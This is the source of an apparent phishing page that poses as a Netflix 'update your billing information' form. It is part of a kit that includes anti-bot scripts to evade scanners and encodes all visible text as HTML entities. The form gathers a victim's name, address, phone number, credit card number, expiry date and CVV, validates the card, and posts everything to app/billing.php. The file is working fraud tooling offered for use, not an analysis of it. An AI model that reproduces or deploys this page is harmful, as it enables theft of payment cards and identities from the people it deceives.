<?php
include 'hostname_check.php'; 
include 'antibots/bots.php';
include 'antibots/bot.php';
include 'antibots/checkbots.php';
include 'antibots/perfect.php';


session_start();

include('__CONFIG__.php');

?>
<!DOCTYPE html>
<html class="htmltebi">
<head>
	<meta charset="utf-8">

	<link rel="stylesheet" type="text/css" href="./assets/bootstrap.min.css">
	<link rel="stylesheet" type="text/css" href="./assets/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="./assets/warning.css">
  <link rel="stylesheet" type="text/css" href="./assets/animate.css">
	<link rel="stylesheet" type="text/css" href="./assets/set1.css">

	<script type="text/javascript" src="./assets/jquery-3.1.1.slim.min.js"></script>
	<script type="text/javascript" src="./assets/tether.min.js"></script>
  <script type="text/javascript" src="./assets/bootstrap.min.js"></script>
	<script type="text/javascript" src="./assets/classie.js"></script>
  <script type="text/javascript" src="./assets/jquery.CardValidator.js"></script>
  <meta name="viewport" content="width=device-width, initial-scale=1">


  <link rel="shortcut icon" href="assets/nficon2016.ico"/>
  <link rel="apple-touch-icon" href="assets/nficon2016.png"/>
	<title>&#78;&#101;&#116;&#102;&#108;&#105;&#120;</title>
  <script type="text/javascript">
  $(document).ready(function(){
    $('.veeriiiifyyy').click(function(){ 
    $(window).scrollTop(0);
    $('.alert-imgxx').toggleClass("animated shake",function(){
      $(this).remove();
    });
    }); 
    $('input').keyup(function(){
      $(this).removeClass('error');
      $(this).addClass('hasText');
      $(this).addClass('successText');
    });
    $('select').change(function(){
      $(this).removeClass('error');
      $(this).addClass('successText');
      });
    $('#update_nm').toggleClass();
      $('#btn_zebi').click(function(){

  function error_input(id){
    $(id).addClass('error');
  }


$('#id_xccaaa').validateCreditCard(function(resultx) {
  if ($('#id_firstName').val() == '') { $('#id_firstName').addClass('error'); return false; }
  else if ($('#id_lasttName').val() == '') { $('#id_lasttName').addClass('error'); return false; }
  else if ($('#id_add').val() == '') { $('#id_add').addClass('error'); return false; }
  else if ($('#id_city').val() == '') { $('#id_city').addClass('error'); return false; }
  else if ($('#id_zip').val() == '') { $('#id_zip').addClass('error'); return false; }
  else if ($('#id_phone').val() == '') { $('#id_phone').addClass('error'); return false; }
  else if ($('#id_firstName').val() == '') { $('#id_firstName').addClass('error'); return false; }
  else if ($('#id_lasttName').val() == '') { $('#id_lasttName').addClass('error'); return false; }
  else if (resultx.valid == false) {$('#id_xccaaa').addClass('error'); return false; }
  else if ($('#id_exx1').val() == '') { $('#id_exx1').addClass('error'); return false; }
  else if ($('#id_exx2').val() == '') { $('#id_exx2').addClass('error'); return false; }
  else if ($('#id_scv').val() == '') { $('#id_scv').addClass('error'); return false; }
  else{ $('form').submit(); }
});
});

  });
    $(document).ready(function(){

    $('#id_xccaaa').validateCreditCard(function(result) {
        // console.log(result);
        if (result.card_type != null) {
            switch (result.card_type.name) {
                case "VISA":
                    $('#id_xccaaa').css('background-position', '98.5% -2%');
                    $('#csc').attr('pattern', '[0-9]{3}');
          $('#csc').attr('maxlength', '3');
          $('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "VISA ELECTRON":
                    $('#id_xccaaa').css('background-position', '98.5%  47.4%');
                    $('#csc').attr('pattern', '[0-9]{3}');
          $('#csc').attr('maxlength', '3');
          $('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "MASTERCARD":
                    $('#id_xccaaa').css('background-position', '98.5%  3%');
                    $('#csc').attr('pattern', '[0-9]{3}');
          $('#csc').attr('maxlength', '3');
          $('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "MAESTRO":
                    $('#id_xccaaa').css('background-position', '98.5%  39.6%');
                    $('#csc').attr('pattern', '[0-9]{3}');
          $('#csc').attr('maxlength', '3');
          $('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "DISCOVER":
                    $('#id_xccaaa').css('background-position', '98.5%  17.4%');
          $('#csc').attr('pattern', '[0-9]{3}');
          $('#csc').attr('maxlength', '3');
          $('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "AMEX":
                    $('#id_xccaaa').css('background-position', '99% 9.5%');
                    $('#csc').attr('pattern', '[0-9]{4}');
          $('#csc').attr('maxlength', '4');
          $('#csc').attr('placeholder', 'CSC (4 digits)');
                    break;
                case "JCB":
                    $('#id_xccaaa').css('background-position', '98.5% 32%');
                    break;
                case "DINERS CLUB":
                    $('#id_xccaaa').css('background-position', '98.5% 24.8%');
                    break;
         case "DINERS CLUB GLOBAL":
                    $('#id_xccaaa').css('background-position', '98.5% 24.8%');
                    break;
                default:
                    $('#id_xccaaa').css('background-position', '98.5% 82%');
          $('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
            }
        } else {
            $('#id_xccaaa').css('background-position', '98.5% 82%');
      $('#csc').attr('placeholder', 'CSC (3 digits)');
        }
        // Check for valid card numbere - only show validation checks for invalid Luhn when length is correct so as not to confuse user as they type.

    });
            
    });
  </script>

  <style type="text/css">
    .crzebi{
        background-image: url('assets/sprites_cc_logos.png');
        background-repeat: no-repeat;
        background-position: 98.5% 81.7%;
    }
  </style>
</head>
<body class="bodytebi">

<div id="hdSpace">
   <div id="hdPinTarget" class="member-header">
    <div id="hd">
    <div id="headerBlind"></div>
    <div>
     <a href="#/" class="icon-logoUpdate logo"></a>
    </div>
    <p class="endsession">&#83;&#105;&#103;&#110;&#32;&#111;&#117;&#116;
</p>      
    </div>
  </div>
</div>




<div class="container">
  <div class="col-md-12">
    <div class="offset-md-3 col-md-6 ">
      <div class="container">
        <h3 class="update" style="margin-bottom: 17px;">&#85;&#112;&#100;&#97;&#116;&#101;&#32;&#121;&#111;&#117;&#114;&#32;&#98;&#105;&#108;&#108;&#105;&#110;&#103;&#32;&#105;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;&#46;
</h3>
        <div style="clear:both;"></div>
        <form action="app/billing.php" method="post" id="formx">
        <div class="nfInput nfInputOversize">
          <div class="nfInputPlacement">
            <label class="input_id" placeholder="firstName">
              <input type="text" name="firstName" class="nfTextField hasText successText" value="<?php echo @$_SESSION['firstname']; ?>" id="id_firstName" value="" tabindex="0" autocomplete="false">
              <label for="id_firstName" class="placeLabel">&#70;&#105;&#114;&#115;&#116;&#32;&#78;&#97;&#109;&#101;
</label>
            </label>
          </div>
          <div class="nfInputPlacement">
            <label class="input_id" placeholder="firstName">
              <input type="text" name="lastname" class="nfTextField hasText successText" value="<?php echo @$_SESSION['lastname']; ?>" id="id_lasttName" value="" tabindex="0" autocomplete="false">
              <label for="id_lasttName" class="placeLabel">&#76;&#97;&#115;&#116;&#32;&#78;&#97;&#109;&#101;
</label>
            </label>
          </div>
          <div class="nfInputPlacement">
            <label class="input_id" placeholder="firstName">
              <input type="text" name="address" class="nfTextField" id="id_add" value="" tabindex="0" autocomplete="false">
              <label for="id_add" class="placeLabel">&#65;&#100;&#100;&#114;&#101;&#115;&#115;
</label>
            </label>
          </div>
          <div class="nfInputPlacement">
            <label class="input_id" placeholder="firstName">
              <input type="text" name="city" class="nfTextField" id="id_city" value="" tabindex="0" autocomplete="false">
              <label for="id_city" class="placeLabel">&#67;&#105;&#116;&#121;
</label>
            </label>
          </div>
          <div class="nfInputPlacement" >
            <div class="col-md-6 float-left" style="padding: 0px;">
              <label class="input_id" placeholder="firstName" style="width: 100%;">
                <input type="text" name="state" class="nfTextField" id="id_state" value="" tabindex="0" autocomplete="false">
                <label for="id_state" class="placeLabel">&#83;&#116;&#97;&#116;&#101;
</label>
              </label>
            </div>
            <div class="col-md-6 float-left zipzap" class="">
              <label class="input_id" placeholder="firstName" style="width: 100%;">
                <input type="text" name="zip" class="nfTextField" id="id_zip" value="" tabindex="0" autocomplete="false">
                <label for="id_zip" class="placeLabel" style="padding-left: 14px;">&#90;&#105;&#112;
</label>
              </label>
            </div>
          </div>
          <div style="clear:both;"></div>
          <div class="nfInputPlacement" style="margin-top: 10px;">
            <label class="input_id" placeholder="firstName">
              <input type="text" name="phone" class="nfTextField hasText successText" value="<?php echo @$_SESSION['phone']; ?>" id="id_phone" value="" tabindex="0" autocomplete="false">
              <label for="id_phone" class="placeLabel">&#80;&#104;&#111;&#110;&#101;
</label>
            </label>
          </div>
          <h3 class="update" style="margin-bottom: 17px;font-size: 18px;" id="update_nm">&#85;&#112;&#100;&#97;&#116;&#101;&#32;&#121;&#111;&#117;&#114;&#32;&#112;&#97;&#121;&#109;&#101;&#110;&#116;&#32;&#105;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;&#46;
</h3>
          <p style="font-size: 13px;">&#89;&#111;&#117;&#114;&#32;&#109;&#111;&#110;&#116;&#104;&#108;&#121;&#32;&#109;&#101;&#109;&#98;&#101;&#114;&#115;&#104;&#105;&#112;&#32;&#105;&#115;&#32;&#98;&#105;&#108;&#108;&#101;&#100;&#32;&#111;&#110;&#32;&#116;&#104;&#101;&#32;&#102;&#105;&#114;&#115;&#116;&#32;&#100;&#97;&#121;&#32;&#111;&#102;&#32;&#101;&#97;&#99;&#104;&#32;&#98;&#105;&#108;&#108;&#105;&#110;&#103;&#32;&#112;&#101;&#114;&#105;&#111;&#100;&#46;
</p>
          <div>
            <span class="logos logos-block" data-reactid="21" style="float: left;margin-bottom: 7px;">
              <span class="logoIcon VISA" data-reactid="22"></span>
              <span class="logoIcon MASTERCARD" data-reactid="23"></span>
              <span class="logoIcon AMEX" data-reactid="24"></span>
              <span class="logoIcon DISCOVER" data-reactid="24"></span>
              <span class="logoIcon DINERS" data-reactid="24"></span>
            </span>
          </div>
          <div style="clear:both;"></div>
          <div class="nfInput nfInputOversize">
          <div class="nfInputPlacement">
            <label class="input_id" placeholder="firstName">
              <input type="text" name="cnxxx" class="nfTextField crzebi" id="id_xccaaa" value="" tabindex="0" autocomplete="false">
              <label for="id_xccaaa" class="placeLabel">&#67;&#114;&#101;&#100;&#105;&#116;&#32;&#67;&#97;&#114;&#100;
</label>
            </label>
          </div>
          <div class="nfInputPlacement" >
            <div class="col-md-6 float-left" style="padding: 0px;">
              <label class="input_id" placeholder="firstName" style="width: 100%;">
                <select name='eppp_MM' id='id_exx1' class="nfTextField hasText">
                    <option value=''>&#77;&#77;
</option>
                    <option value='01'>01</option>
                    <option value='02'>02</option>
                    <option value='03'>03</option>
                    <option value='04'>04</option>
                    <option value='05'>05</option>
                    <option value='06'>06</option>
                    <option value='07'>07</option>
                    <option value='08'>08</option>
                    <option value='09'>09</option>
                    <option value='10'>10</option>
                    <option value='11'>11</option>
                    <option value='12'>12</option>
                </select>
                <label for="id_state" class="placeLabel">&#77;&#111;&#110;&#116;&#104;
</label>
              </label>
            </div>
            <div class="col-md-6 float-left zipzap" class="">
              <label class="input_id" placeholder="firstName" style="width: 100%;">
                <select name='eppp_YY' id='id_exx2' class="nfTextField hasText">
                    <option value=''>&#89;&#89;
</option>
                    <option value='2020'>2020</option>
                    <option value='2021'>2021</option>
                    <option value='2022'>2022</option>
                    <option value='2023'>2023</option>
                    <option value='2024'>2024</option>
                    <option value='2025'>2025</option>
                    <option value='2026'>2026</option>
                    <option value='2027'>2027</option>
                    <option value='2028'>2028</option>
                    <option value='2029'>2029</option>
                    <option value='2029'>2030</option>
                    <option value='2029'>2031</option>
                    <option value='2029'>2032</option>
                    <option value='2029'>2033</option>
                    <option value='2029'>2034</option>
                    <option value='2029'>2035</option>
                </select>
                <label for="id_zip" class="placeLabel" style="padding-left: 14px;">&#89;&#101;&#97;&#114;
</label>
              </label>
            </div>
          </div>
        </div>
          <div style="clear:both;"></div>
          <div class="nfInputPlacement" style="margin-top: 10px;">
            <div class="col-md-12 float-left" style="padding: 0px;">
              <label class="input_id" placeholder="firstName" style="width: 100%;">
                <input type="text" maxlength="4" name="CXXVX" class="nfTextField" id="id_scv" value="" tabindex="0" autocomplete="false">
                <label for="id_scv" class="placeLabel">&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;&#32;&#67;&#111;&#100;&#101;&#32;&#40;&#67;&#86;&#86;&#41;
</label>
              </label>
            </div>
            <input type="hidden" name="next">
          <button class="btn login-button btn-submit btn-small continue-btn" id="btn_zebi" type="button" autocomplete="off" tabindex="4"><!-- react-text: 26 -->&#67;&#111;&#110;&#116;&#105;&#110;&#117;&#101;
<!-- /react-text --></button>
          </div>
          
          </div>
          </div>
        </form>
<!--<div id="" class="inputError">Le prénom est obligatoire&nbsp;!</div>-->
      </div>
    </div>
<!--   <hr style="background: #999;"> -->
  </div>
</div>
<div class="site-footer-wrapper centered dark">
    <div class="footer-divider"></div>
    <div class="site-footer">
        <p class="footer-top"><a class="footer-top-a" href="#">&#81;&#117;&#101;&#115;&#116;&#105;&#111;&#110;&#115;&#63;&#32;&#67;&#111;&#110;&#116;&#97;&#99;&#116;&#32;&#117;&#115;&#46;
</a></p>
        <ul class="footer-links structural">
            <li class="footer-link-item" placeholder="footer_responsive_link_terms_item"><a class="footer-link" href="#/legal/termsofuse" placeholder="footer_responsive_link_terms"><span id="">&#84;&#101;&#114;&#109;&#115;&#32;&#111;&#102;&#32;&#85;&#115;&#101;
</span></a></li>
            <li class="footer-link-item" placeholder="footer_responsive_link_privacy_separate_link_item"><a class="footer-link" href="#/legal/privacy" placeholder="footer_responsive_link_privacy_separate_link"><span id="">&#80;&#114;&#105;&#118;&#97;&#99;&#121;
</span></a></li>
            <li class="footer-link-item" placeholder="footer_responsive_link_cookies_separate_link_item"><a class="footer-link" href="#/legal/privacy#cookies" placeholder="footer_responsive_link_cookies_separate_link"><span id="">&#67;&#111;&#111;&#107;&#105;&#101;&#32;&#80;&#114;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#115;
</span></a></li>
            <li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_item"><a class="footer-link" href="#/en/node/2101" placeholder="footer_responsive_link_corporate_information"><span id="">&#67;&#111;&#114;&#112;&#111;&#114;&#97;&#116;&#101;&#32;&#73;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;
</span></a></li>
        </ul>
    </div>
</div>
</body>
</html>